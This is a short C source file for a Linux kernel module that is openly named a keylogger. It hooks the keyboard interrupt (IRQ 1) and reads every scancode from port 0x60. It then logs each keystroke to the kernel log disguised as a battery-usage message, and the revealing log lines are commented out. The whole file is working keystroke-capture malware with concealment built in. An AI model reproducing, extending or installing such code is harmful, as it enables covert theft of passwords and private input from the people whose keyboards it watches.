#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs);
void __exit irq_cleanup(void);
int const keylogger = 0; // Just to use its addres as dev_id

// Initialize the module − register the IRQ handler
int init_module() {
	// printk(KERN_ALERT "Keylogger started");

	return request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "keylogger", (void *)(&keylogger));
}

// This function services keyboard interrupts.
irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
	static unsigned char scancode;
	char *key = NULL;

	scancode = inb(0x60); // Get scancode from specific input port.

	key = (char*) &scancode;

	// printk("Key was: %#2x in hexadecimal\n", scancode);
	// printk("Key was: %d in decimal \n\n", scancode);
	printk("Battery spent %d mw\n", scancode);

	return (irq_handler_t) IRQ_HANDLED;
}

void __exit irq_cleanup(void) {
	// printk(KERN_ALERT "Stopping keylogger...\n");
	free_irq(1, (void *)(&keylogger));
}

module_exit(irq_cleanup);

MODULE_LICENSE("GPL");
